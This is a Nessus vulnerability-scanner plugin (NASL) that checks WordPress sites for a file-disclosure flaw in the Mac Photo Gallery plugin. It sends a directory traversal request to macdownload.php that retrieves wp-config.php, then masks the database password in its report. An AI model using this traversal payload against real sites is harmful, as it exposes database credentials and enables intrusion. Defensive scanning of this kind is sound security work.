#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(62205);
  script_version("$Revision: 1.6 $");
  script_cvs_date("$Date: 2015/09/24 23:21:23 $");

  script_bugtraq_id(54128);
  script_osvdb_id(83084);

  script_name(english:"Mac Photo Gallery for WordPress 'albid' Parameter Traversal Arbitrary File Access");
  script_summary(english:"Attempts to view the wp-config.php file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote file disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Mac Photo Gallery for WordPress hosted on the remote web server is
affected by a file disclosure vulnerability due to a failure to
properly sanitize user-supplied input to the 'albid' parameter of the
'macdownload.php' script. This vulnerability allows an
unauthenticated, remote attacker to read arbitrary files by forming a
request containing directory traversal sequences.");
  # http://ceriksen.com/2012/06/21/wordpress-mac-photo-gallery-plugin-albid-arbitrary-file-disclosure-vulnerability/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?068d2f46");
  script_set_attribute(attribute:"see_also", value:"http://plugins.trac.wordpress.org/changeset/561047/mac-dock-gallery");

  script_set_attribute(attribute:"solution", value:"Upgrade to version 2.10 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"WordPress Mac Photo Gallery 2.8 File Disclosure");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/06/21");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/06/20");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/09/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "Mac Photo Gallery";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "mac-dock-gallery/js/macGallery.js"][0] =
    make_list('function macAlbum', 'Mac Album Page id');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

url = "wp-content/plugins/mac-dock-gallery/macdownload.php?" +
      "albid=../../../wp-config.php";

res = http_send_recv3(
  method       : "GET",
  item         : dir + "/" + url,
  port         : port,
  exit_on_fail : TRUE
);

# Check response to see if we get headers for a download attempt
# and check to see if our response is from a patched version
if (
  "Content-Disposition: attachment; filename=wp-config.php" >< res[1] &&
  "base configurations of the WordPress" >< res[2] &&
  "* @package WordPress" >< res[2]
)
{
  # Format our output for reporting
  full_page = strstr(res[2], " * The base configurations");
  pos = stridx(full_page, "/** The Database Collate type.");
  output = substr(full_page, 0, pos-1);

  # Mask password except first and last characters
  get_pass = eregmatch(pattern:"'DB_PASSWORD', '(.+)'", string:output);

  if (!isnull(get_pass))
  {
    pass = get_pass[1];
    pass2 = strcat(pass[0], crap(data:'*', length:15), pass[strlen(pass)-1]);
    output = str_replace(string:output, find:pass, replace:pass2);
  }

  if (report_verbosity > 0)
  {
    snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
    report =
      '\nNessus was able to verify the issue with the following request :' +
      '\n' +
      '\n' + install_url + url +
      '\n';
    if (report_verbosity > 1)
    {
      report +=
        '\n' + 'This produced the following output. Note that a password has' +
        '\nbeen partially obfuscated in the truncated file displayed below :' +
        '\n' +
        '\n' + snip +
        '\n' + chomp(output) +
        '\n' + snip +
        '\n';
    }
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
